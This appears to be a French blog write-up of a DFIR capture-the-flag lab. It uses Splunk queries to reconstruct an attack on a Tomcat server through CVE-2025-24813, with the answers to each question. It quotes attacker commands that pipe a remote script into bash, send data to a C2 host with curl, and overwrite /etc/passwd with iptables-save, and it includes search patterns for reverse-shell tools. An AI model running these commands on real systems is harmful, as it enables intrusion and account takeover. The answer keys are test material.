---
layout: single
header:
  overlay_image: /assets/images/banner-014.jpg
  overlay_filter: 0.6
toc: true
toc_depth: 6
toc_label: Table of Contents
title: "Lab Cattery : de la reconnaissance à la persistance via CVE-2025-24813 (Tomcat Partial PUT)"
date: 2026-10-15
categories: [DFIR, SOC]
tags: [dfir, splunk, spl, tomcat, cve-2025-24813, partial-put, reverse-shell, systemd-persistence, account-manipulation, mitre-attck, secdojo, ctf]
---

# Lab Cattery : exploitation de Tomcat (CVE-2025-24813) et persistance

> **Index Splunk :** `cattery`
> **Cible :** `172.16.92.103`
> **IP attaquant observée :** `193.253.225.147`
> **Serveur d'exfiltration / contrôle observé :** `172.16.92.160`
> **Vulnérabilité étudiée :** CVE-2025-24813
> **Résultat :** ✅ chaîne d'attaque reconstituée, de la reconnaissance à la persistance, avec un point non déterminable (Q12)


## Périmètre

| Élément | Valeur |
| --- | --- |
| Index Splunk | `cattery` |
| Cible | `172.16.92.103` |
| IP attaquant | `193.253.225.147` |
| Serveur C2 / exfiltration | `172.16.92.160` |
| CVE étudiée | `CVE-2025-24813` |

## Q1 — Heure du directory brute force

**Question :** à quelle heure (heure:minute) l'attaquant a-t-il lancé la force brute des répertoires contre `172.16.92.103` ?

**Réponse :** `20:08`

```spl
index=cattery host=ip-172-16-92-103 src_ip=193.253.225.147
| sort 0 _time
| table _time uri method status _raw
```

Sortie observée :

```text
2026-10-13 20:08:08  193.253.225.147  "GET / HTTP/1.1" 200
2026-10-13 20:11:27  193.253.225.147  "GET / HTTP/1.0" 200
2026-10-13 20:11:27  193.253.225.147  "PROPFIND / HTTP/1.1" 405
2026-10-13 20:12:45  193.253.225.147  "GET /cp HTTP/1.1" 404
2026-10-13 20:12:55  193.253.225.147  "GET /nc HTTP/1.1" 404
2026-10-13 20:13:05  193.253.225.147  "GET /awk HTTP/1.1" 404
2026-10-13 20:13:09  193.253.225.147  "GET /mv HTTP/1.1" 404
```

> ⚠️ **Point important :** `20:11` correspond à `PROPFIND` et ne doit pas être utilisé comme réponse. La plateforme valide `20:08` (premier `GET /`) pour le début de l'attaque par force brute de répertoire.

## Q2 — IP de l'attaquant

**Réponse :** `193.253.225.147`

```spl
index=cattery 172.16.92.103
| stats count by src_ip clientip remoteip
```

Sortie observée :

```text
193.253.225.147 - - [13/Oct/2026:20:08:08 +0000] "GET / HTTP/1.1" 200
193.253.225.147 - - [13/Oct/2026:20:11:27 +0000] "PROPFIND / HTTP/1.1" 405
193.253.225.147 - - [13/Oct/2026:20:24:55 +0000] "PUT /pocss/session HTTP/1.1" 409
```

## Q3 — URI ayant produit HTTP 400

**Question :** pendant le scan du serveur web, quel chemin URI a produit un statut 400 Bad Request ?

**Réponse :** `/http%3A%2F%2Fwww`

```spl
index=cattery host=ip-172-16-92-103 status=400
| table _time uri uri_path status _raw
```

Sortie observée :

```text
2026-10-13 20:14:17  /http%3A%2F%2Fwww  400
"GET /http%3A%2F%2Fwww HTTP/1.1" 400 841
```

> ℹ️ La même URI apparaît de nouveau le 14 octobre à `23:54:59`.

## Q4 et Q5 — Requête PUT et son statut

**Q4 — Question :** vers quel chemin URI précis l'attaquant a-t-il envoyé une requête HTTP PUT ?
**Réponse Q4 :** `/pocss/session`

**Q5 — Question :** quel code de statut HTTP le serveur a-t-il retourné en réponse à cette requête PUT ?
**Réponse Q5 :** `409`

```spl
index=cattery host=ip-172-16-92-103 method=PUT
| table _time uri uri_path status _raw
```

Sortie observée :

```text
2026-10-13 20:24:55
193.253.225.147 - - [13/Oct/2026:20:24:55 +0000]
"PUT /pocss/session HTTP/1.1" 409 653
```

## Q6 — Commande du reverse shell

**Question :** quelle est la commande complète exécutée par l'attaquant pour établir une connexion reverse shell vers sa machine ?

**Réponse documentée par les extraits :**

```bash
/bin/bash -c 'curl -s http://172.16.92.160:8080/Klaomqka.sh | bash'
```

```spl
index=cattery host=ip-172-16-92-103
("Klaomqka.sh" OR "curl" OR "bash" OR "bash -i" OR "/dev/tcp/" OR "nc ")
| table _time type comm exe a0 a1 a2 proctitle _raw
| sort 0 _time
```

Sortie audit observée :

```text
EXECVE argc=3
 a0="/bin/bash"
 a1="-c"
 a2=6375726C202D7320687474703A2F2F3137322E31362E39322E3136303A383038302F4B6C616F6D716B612E7368207C2062617368
```

Le champ hexadécimal `a2` se décode en :

```bash
curl -s http://172.16.92.160:8080/Klaomqka.sh | bash
```

Le PROCTITLE confirme :

```text
/bin/bash -c curl -s http://172.16.92.160:8080/Klaomqka.sh | bash
```

> ⚠️ **Point important :** la commande reverse shell elle-même se trouve à l'intérieur de `Klaomqka.sh`. Les fichiers fournis ne contiennent ni `bash -i`, ni `/dev/tcp/`, ni `nc -e`, ni `socat` avec les arguments complets. **Ne pas présenter la commande `curl ... | bash` comme le reverse shell confirmé** — elle prouve seulement le téléchargement et le lancement du script, pas son contenu interne.

## Q7 et Q8 — Version Tomcat et CVE exploitée

**Q7 — Réponse :** `Apache Tomcat/9.0.97`

```spl
index=cattery host=ip-172-16-92-103
("Server version name" OR "Apache Tomcat" OR "Tomcat/")
| table _time _raw
```

```text
Server version name:   Apache Tomcat/9.0.97
```

**Q8 — Réponse :** `CVE-2025-24813`

Cette vulnérabilité concerne la fonctionnalité de **partial PUT** de Tomcat et correspond à la requête PUT observée vers `/pocss/session`.

## Q9 — Hash de remplacement du compte root

**Question :** quel est le hash complet du mot de passe que l'attaquant a utilisé pour remplacer le hash original de l'utilisateur root ?

**Réponse :** `$1$QTqWcg6I$tlaKEz063dehF6HD5eCG01`

```spl
index=cattery host=ip-172-16-92-103
("root:" OR "file_passwd" OR "iptables-save" OR "/etc/shadow")
| table _time type comm a0 a1 a2 a3 _raw
| sort 0 _time
```

Preuve décodée — le payload envoyé par l'attaquant contient la ligne :

```text
root:$1$QTqWcg6I$tlaKEz063dehF6HD5eCG01:0:0:root:/root:/bin/bash
```

> 💡 Le hash à soumettre est uniquement la partie située entre `root:` et `:0:0`.

Commande observée associée au payload :

```bash
curl -s -X POST http://172.16.92.160:8080?hostname=ip-172-16-92-207&type=file_passwd -d <payload>
```

Le payload décodé est une sortie `iptables-save` contenant la ligne `root:`, montrant la valeur du hash injecté.

## Q10 — Commande d'écrasement de /etc/passwd

**Question :** quelle commande l'attaquant a-t-il utilisée pour écraser `/etc/passwd`, finalisant le changement du mot de passe root ?

**Réponse :** `iptables-save -f /etc/passwd`

```spl
index=cattery host=ip-172-16-92-103 type=EXECVE
("iptables-save" OR "/etc/passwd")
| table _time a0 a1 a2 a3 _raw
| sort 0 _time
```

Sortie observée :

```text
EXECVE argc=3
 a0="iptables-save"
 a1="-f"
 a2="/etc/passwd"
```

Le processus parent est également visible :

```text
EXECVE argc=4
 a0="sudo"
 a1="iptables-save"
 a2="-f"
 a3="/etc/passwd"
```

Le payload décodé commence par :

```text
# Generated by iptables-save v1.8.9 (nf_tables)
...
root:$1$QTqWcg6I$tlaKEz063dehF6HD5eCG01:0:0:root:/root:/bin/bash
...
```

Cela explique pourquoi `/etc/passwd` a été remplacé par une sortie d'`iptables-save` contenant une ligne root manipulée.

## Q11 — Service systemd de persistance

**Question :** quel est le nom du service systemd créé par l'attaquant pour assurer sa persistance ?

**Réponse :** `Klaomqka.service`

```spl
index=cattery host=ip-172-16-92-103
("Klaomqka.service" OR "unit=Klaomqka" OR "systemctl enable")
| table _time type comm a0 a1 a2 _raw
| sort 0 _time
```

Sorties observées :

```text
type=PATH ... name="/etc/systemd/system/Klaomqka.service" ... nametype=CREATE
type=EXECVE ... argc=3 a0="systemctl" a1="enable" a2="Klaomqka.service"
type=SERVICE_START ... unit=Klaomqka ... res=success
```

Commande d'activation observée :

```bash
systemctl enable Klaomqka.service
```

> ℹ️ Le nom court du service est `Klaomqka` ; le nom complet du fichier systemd est `Klaomqka.service`.

## Q12 — Commande crontab (non déterminable)

**Question :** quelle commande exacte l'attaquant a-t-il planifiée via crontab ?

**Réponse :** non déterminable à partir des extraits fournis.

```spl
index=cattery host=ip-172-16-92-103
(type=EXECVE OR type=PROCTITLE)
("crontab" OR "/etc/cron" OR "/var/spool/cron" OR "Klaomqka")
| table _time type comm exe a0 a1 a2 a3 proctitle _raw
| sort 0 _time
```

Sortie fournie :

```text
type=PATH ... name="/etc/cron.d" ...
type=PATH ... name="/etc/cron.daily" ...
type=PATH ... name="/etc/cron.weekly" ...
type=CONFIG_CHANGE ... key="cron" ... op=add_rule
```

> ⚠️ Aucune ligne contenant la commande planifiée n'a été fournie. Les sorties disponibles concernent les règles d'audit cron et les répertoires système, **pas le contenu d'une crontab**. Il faut donc conserver la réponse comme non confirmée plutôt que de déduire une commande à partir de `Klaomqka.sh`.

## Q13 à Q17 — Classification MITRE ATT&CK

| # | Question | Réponse | Justification |
| --- | --- | --- | --- |
| Q13 | Tactique du scan initial | **B.** Reconnaissance — T1595.001: Active Scanning: Scanning IP Blocks | Les requêtes répétées vers des chemins comme `/cp`, `/nc`, `/sed`, `/awk` et `/mv` constituent une activité de reconnaissance et de scan actif |
| Q14 | Tactique de l'exploitation Tomcat | **C.** Initial Access | L'exploitation d'une application exposée publiquement pour obtenir un accès initial relève de la tactique Initial Access |
| Q15 | Objectif du reverse shell | **C.** Both a and b (T1071.001 *et* T1059.004) | Le reverse shell utilise un interpréteur de commandes Unix (Execution) et fournit un canal de communication avec l'attaquant (Command and Control) |
| Q16 | Technique du changement de hash root | **B.** T1098: Account Manipulation | Le remplacement du hash du compte root modifie les informations d'authentification du compte |
| Q17 | Tactique de l'ajout crontab | **C.** Persistence | Une entrée cron permet de relancer périodiquement une commande après la compromission |

## Chaînage logique de l'investigation

```text
Q1 + Q2
Quand et depuis quelle IP l'attaque commence-t-elle ?
        │
        ▼
Q3 + Q13
Quels chemins sont testés et quelle tactique décrit le scan ?
        │
        ▼
Q4 + Q5
Quelle ressource PUT est ciblée et quel statut retourne le serveur ?
        │
        ▼
Q7 + Q8 + Q14
Quel Tomcat est présent, quelle CVE est exploitée et quelle tactique cela représente ?
        │
        ▼
Q6 + Q15
Quelle commande post-exploitation est lancée et quel est le rôle du reverse shell ?
        │
        ▼
Q9 + Q10 + Q16
Quel hash root est injecté, comment /etc/passwd est-il écrasé et quelle technique MITRE est utilisée ?
        │
        ▼
Q11 + Q12 + Q17
Quels mécanismes de persistance sont installés et quelle tactique les regroupe ?
```

### Explications pédagogiques

- **Q1 → Q2 :** `20:08` fixe le début de la chronologie, `193.253.225.147` identifie l'origine réseau de cette activité. Q1 répond à « quand ? », Q2 à « depuis quelle adresse ? ».
- **Q3 → Q13 :** l'URI `/http%3A%2F%2Fwww` fait partie des tests envoyés pendant la reconnaissance ; elle est classée comme scan actif en Q13.
- **Q4 → Q5 :** la requête PUT `/pocss/session` est plus significative que les simples tests de chemins de Q3 : elle tente d'écrire ou de modifier une ressource côté serveur. Q4 identifie le chemin, Q5 donne le résultat HTTP de cette même requête.
- **Q7 + Q8 → Q14 :** la version Tomcat confirme le logiciel ciblé ; la CVE explique la combinaison version + requête PUT observée ; Q14 classe cette exploitation dans la tactique MITRE Initial Access.
- **Q6 → Q15 :** la commande `curl ... | bash` est la transition entre l'exploitation initiale et la post-exploitation. Le contenu interne du script n'étant pas fourni, elle ne doit pas être présentée comme la ligne reverse shell interne elle-même ; Q15 explique son rôle fonctionnel (Execution + C2).
- **Q9 + Q10 → Q16 :** Q9 identifie **le résultat** de la modification (la valeur du hash injecté), Q10 identifie **le mécanisme** (la commande d'écriture). Q16 attribue la technique MITRE à l'ensemble de cette action.
- **Q11 + Q12 → Q17 :** deux mécanismes de persistance différents (service systemd confirmé en Q11, crontab non confirmée en Q12), tous deux classés sous la tactique Persistence en Q17.

## Indicateurs de compromission

| Type | Valeur |
| --- | --- |
| IP attaquant | `193.253.225.147` |
| Serveur C2 / exfiltration | `172.16.92.160:8080` |
| Script de persistance | `Klaomqka.sh` |
| Service systemd créé | `Klaomqka.service` (`/etc/systemd/system/Klaomqka.service`) |
| Endpoint exploité | `PUT /pocss/session` |
| Version Tomcat vulnérable | `Apache Tomcat/9.0.97` |
| CVE exploitée | `CVE-2025-24813` (partial PUT) |
| Hash root injecté | `$1$QTqWcg6I$tlaKEz063dehF6HD5eCG01` |
| Commande d'écrasement passwd | `iptables-save -f /etc/passwd` |

## Leçons retenues

- Une requête `PROPFIND` avant le premier `GET` ne doit pas être confondue avec le véritable début de l'activité malveillante — toujours trier chronologiquement l'ensemble des événements avant de désigner un point de départ.
- Observer une commande de téléchargement (`curl ... | bash`) ne prouve pas le contenu du script téléchargé : sans le corps de `Klaomqka.sh`, le détail exact du reverse shell reste non confirmé, et un rapport rigoureux doit le signaler explicitement plutôt que de l'assumer.
- `CVE-2025-24813` illustre comment une fonctionnalité légitime mais mal sécurisée (le **partial PUT** de Tomcat) peut devenir un vecteur d'accès initial — la version du logiciel exposé (Q7) est aussi importante que le comportement réseau observé (Q4/Q5) pour confirmer une CVE.
- Distinguer **le résultat** d'une action (la valeur du hash injecté, Q9) du **mécanisme** qui la produit (la commande d'écriture, Q10) aide à documenter une manipulation de compte de façon complète et vérifiable.
- L'absence de preuve directe (ici, le contenu d'une crontab pour Q12) doit être documentée comme telle plutôt que comblée par déduction — une bonne pratique DFIR systématiquement appliquée dans ce rapport.

## Références

- CVE-2025-24813 — Apache Tomcat, vulnérabilité liée au traitement des requêtes **partial PUT**
- Technique MITRE ATT&CK **T1595.001** — Active Scanning: Scanning IP Blocks
- Technique MITRE ATT&CK **T1190** — Exploit Public-Facing Application
- Technique MITRE ATT&CK **T1059.004** — Command and Scripting Interpreter: Unix Shell
- Technique MITRE ATT&CK **T1071.001** — Application Layer Protocol: Web Protocols
- Technique MITRE ATT&CK **T1098** — Account Manipulation
- Technique MITRE ATT&CK **T1053** (famille) — persistance via systemd/cron
